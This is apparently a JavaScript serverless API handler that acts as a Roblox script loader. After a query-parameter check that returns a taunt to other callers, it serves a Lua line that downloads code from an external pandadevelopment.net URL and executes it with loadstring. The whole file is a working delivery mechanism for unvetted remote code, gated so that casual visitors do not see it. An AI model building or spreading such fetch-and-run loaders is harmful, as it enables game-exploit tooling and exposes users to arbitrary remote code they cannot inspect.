export default function handler(req, res) {
    const startTime = performance.now();

    try {
        const hosted = req.query.hosted;
        
        if (hosted !== "mainloader") {
            return res.status(403).send("nice try better luck next time");
        }

        const luaScriptContent = `loadstring(game:HttpGet("https://vss.pandadevelopment.net/virtual/file/15099ac9f9934333"))()`; 

        const endTime = performance.now();
        const timeTaken = (endTime - startTime).toFixed(2);
        
        const timingWarning = `warn("nice try better luck next time")`;
        
        const finalScript = timingWarning + luaScriptContent;

        res.setHeader("Content-Type", "text/plain");
        return res.status(200).send(finalScript);

    } catch (error) {
        return res.status(500).send("Internal Server Error");
    }
}
